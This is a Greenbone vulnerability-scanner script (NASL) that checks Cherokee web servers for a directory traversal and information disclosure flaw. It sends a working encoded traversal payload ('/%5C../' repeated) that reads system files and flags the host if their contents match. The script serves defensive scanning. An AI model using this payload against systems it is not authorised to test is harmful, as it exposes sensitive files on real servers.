# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100678");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-06-15 13:44:31 +0200 (Tue, 15 Jun 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Cherokee URI Directory Traversal Vulnerability and Information Disclosure Vulnerability");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web Servers");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("gb_cherokee_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("cherokee/detected");

  script_tag(name:"summary", value:"Cherokee is prone to a directory traversal vulnerability and an information-
  disclosure vulnerability because the application fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Tries to read sensitive information.");

  script_tag(name:"impact", value:"Exploiting the issues may allow an attacker to obtain sensitive
  information that could aid in further attacks.");

  script_tag(name:"affected", value:"Cherokee 0.5.4 and prior versions are vulnerable.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/40831");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/511814");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

CPE = "cpe:/a:cherokee-project:cherokee";

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("host_details.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe: CPE, service: "www" ) )
  exit( 0 );

if( ! location = get_app_location( cpe: CPE, port: port ) )
  exit( 0 );

if( location == "/" )
  location = "";

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];
  url = string( location, "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../", file );

  if( http_vuln_check( port: port, url: url, pattern: pattern ) ) {
    report = http_report_vuln_url( port: port, url: url );
    security_message( port: port, data: report );
    exit( 0 );
  }
}

exit( 99 );
